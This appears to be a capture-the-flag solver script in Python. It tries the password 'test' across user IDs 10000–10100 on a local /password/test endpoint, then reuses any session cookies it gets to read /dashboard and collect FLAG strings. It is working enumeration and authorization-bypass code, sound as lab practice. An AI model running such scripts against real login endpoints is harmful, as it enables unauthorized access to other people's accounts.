import requests
import re

# Target configuration
base_url = "http://localhost"
auth_endpoint = "/password/test"
test_password = "test"
start_id = 10000
end_id = 10100

print(f"[*] Fuzzing user_id {start_id}-{end_id} on {auth_endpoint}")

# Track results
successful_auths = []
flags_found = []
failure_count = 0

# Fuzz user_id parameter
for user_id in range(start_id, end_id + 1):
    auth_data = {
        'user_id': user_id,
        'password': test_password
    }
    
    try:
        # Attempt authentication
        auth_response = requests.post(
            f"{base_url}{auth_endpoint}",
            data=auth_data,
            allow_redirects=False,
            timeout=5
        )
        
        # Check for FLAG in auth response
        flag_match = re.findall(r'FLAG\{[^}]+\}', auth_response.text)
        if flag_match:
            print(f"\n[!!! FLAG IN AUTH !!!] user_id={user_id}")
            print(f"Status: {auth_response.status_code}")
            print(f"Flags: {flag_match}")
            print(f"Response:\n{auth_response.text}\n")
            flags_found.append({'user_id': user_id, 'location': 'auth', 'flags': flag_match})
        
        # Track successful authentications
        if auth_response.status_code in [200, 301, 302]:
            successful_auths.append(user_id)
            print(f"[+] user_id={user_id} | Status={auth_response.status_code} | Cookies={dict(auth_response.cookies)}")
            
            # Access dashboard if cookies provided
            if auth_response.cookies:
                try:
                    dash = requests.get(f"{base_url}/dashboard", cookies=auth_response.cookies, timeout=5)
                    dashboard_flags = re.findall(r'FLAG\{[^}]+\}', dash.text)
                    if dashboard_flags:
                        print(f"\n[!!! FLAG IN DASHBOARD !!!] user_id={user_id}")
                        print(f"Flags: {dashboard_flags}")
                        print(f"Dashboard Response:\n{dash.text}\n")
                        flags_found.append({'user_id': user_id, 'location': 'dashboard', 'flags': dashboard_flags})
                except:
                    pass
        else:
            failure_count += 1
    
    except Exception as e:
        failure_count += 1

# Summary
print(f"\n{'='*60}")
print("SUMMARY")
print(f"{'='*60}")
print(f"Tested: {end_id - start_id + 1} IDs")
print(f"Successful: {len(successful_auths)} | Failed: {failure_count}")
print(f"Valid user_ids: {successful_auths}")
print(f"\nFLAGS FOUND: {len(flags_found)}")
for f in flags_found:
    print(f"  user_id={f['user_id']} at {f['location']}: {f['flags']}")

